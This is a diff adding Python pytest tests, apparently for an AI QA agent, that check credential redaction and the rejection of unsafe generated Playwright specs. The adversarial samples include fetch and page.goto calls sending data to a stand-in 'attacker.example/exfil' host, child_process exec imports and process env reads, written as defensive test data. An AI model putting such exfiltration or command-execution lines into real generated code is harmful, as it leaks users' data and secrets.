@@ -301,6 +301,94 @@ def test_detecta_credencial_password():
     assert achados
 
 
+@pytest.mark.parametrize("chave", ["api_key", "password", "access_token", "senha", "Authorization"])
+def test_detecta_e_redige_credencial_json(chave):
+    import json
+
+    segredo = 'sk-real Abc123xyz"fim'
+    texto = json.dumps({chave: segredo, "normal": "preservado"})
+    assert detectar_credenciais(texto)
+    assert json.loads(redigir_segredos(texto)) == {
+        chave: "[REDACTED]", "normal": "preservado"
+    }
+
+
+@pytest.mark.parametrize("codigo", [
+    "page.goto('https://attacker.example/exfil');",
+    "request.get('https://attacker.example/exfil');",
+    "fetch('//attacker.example/exfil');",
+    "fetch(destino);",
+    "fetch('http://localhost/' + destino);",
+    "fetch(\n'https://attacker.example/exfil'\n);",
+    "import fs from 'node:fs/promises';",
+    "import\n{ exec }\nfrom 'node:child_process';",
+    "const env = process['env'];",
+])
+def test_spec_adversarial_rejeitado_antes_de_sobrescrever(codigo, monkeypatch, tmp_path):
+    import importlib
+    modulo = importlib.import_module(
+        "src.agents.qa_agent.subagents.e2e_test_generator.tools.gerar_playwright_spec"
+    )
+    monkeypatch.setattr(modulo, "get_agent_workspace", lambda _: tmp_path)
+    arquivo = tmp_path / "teste.spec.ts"
+    arquivo.write_text("original", encoding="utf-8")
+    monkeypatch.setattr(modulo, "renderizar_playwright_spec", lambda *_: (codigo, 1, 0))
+    with pytest.raises(ValueError, match="risco de segurança"):
+        modulo.gerar_playwright_spec(None, [], "teste")
+    assert arquivo.read_text(encoding="utf-8") == "original"
+
+
+def test_spec_json_com_segredo_nao_persiste(monkeypatch, tmp_path):
+    import importlib
+    modulo = importlib.import_module(
+        "src.agents.qa_agent.subagents.e2e_test_generator.tools.gerar_playwright_spec"
+    )
+    monkeypatch.setattr(modulo, "get_agent_workspace", lambda _: tmp_path)
+    monkeypatch.setattr(modulo, "renderizar_playwright_spec", lambda *_: (
+        'const data = {"api_key": "sk-real-Abc123xyz"};', 1, 0
+    ))
+    with pytest.raises(ValueError, match="risco de segurança"):
+        modulo.gerar_playwright_spec(None, [], "teste")
+    assert not list(tmp_path.iterdir())
+
+
+def test_doubt_artefatos_nao_persistem_segredos(monkeypatch, tmp_path):
+    from shared.tools import doubt_artifact, doubt_tool
+
+    monkeypatch.setattr(doubt_artifact, "_resolve_doubt_dir", lambda: tmp_path)
+    monkeypatch.setattr(doubt_tool, "_resolve_doubt_dir", lambda: tmp_path)
+    segredo = 'sk-real Abc123xyz'
+    evidencia = '{"api_key": "' + segredo + '"}'
+    resultado = doubt_artifact.gerar_doubt_artifact(
+        reason_for_invalidation=evidencia, suspect_code_or_prompt=evidencia,
+        system_raw_response=evidencia, module_name=evidencia,
+        input_artifact_name=evidencia, action_attempted=evidencia,
+    )
+    assert resultado["status"] == "ok"
+    doubt_tool.DoubtArtifactGenerator.generate("TEST", evidencia, evidencia)
+    arquivos = list(tmp_path.glob("*.md"))
+    assert len(arquivos) == 2
+    for arquivo in arquivos:
+        conteudo = arquivo.read_text(encoding="utf-8")
+        assert segredo not in conteudo
+        assert "[REDACTED]" in conteudo
+
+
+def test_pytest_redige_tambem_erros_estruturados(tmp_path):
+    import json
+    import subprocess
+    from shared.tools.pytest_runner import _parse_resultados_pytest
+
+    segredo = "sk-real-Abc123xyz"
+    processo = subprocess.CompletedProcess([], 1,
+        stdout=f'test_exemplo.py:12: AssertionError: api_key="{segredo}"\n1 failed\n',
+        stderr="")
+    resultado = _parse_resultados_pytest(tmp_path / "test_exemplo.py", processo,
+                                       tmp_path / "coverage.json")
+    assert resultado["erros"][0]["linhas_com_erro"]
+    assert segredo not in json.dumps(resultado)
+
+
 @pytest.mark.parametrize(
     "valor", ["fake", "xxx", "dummy", "changeme", "<credencial redigida>"]
 )
@@ -547,6 +635,8 @@ def test_sanitizar_placeholder_pass_ctrl63_continua_sem_regressao():
 
 
 def test_executar_pytest_tool_nao_vaza_google_api_key(monkeypatch, tmp_path):
+    if os.environ.get("QA_SANDBOX_INTEGRATION") != "1":
+        pytest.skip("Requer Docker e imagem QA; habilite QA_SANDBOX_INTEGRATION=1")
     monkeypatch.setenv("WORKSPACE_OUTPUT_DIR", str(tmp_path))
     monkeypatch.setenv("GOOGLE_API_KEY", "segredo-nao-deve-vazar")
 
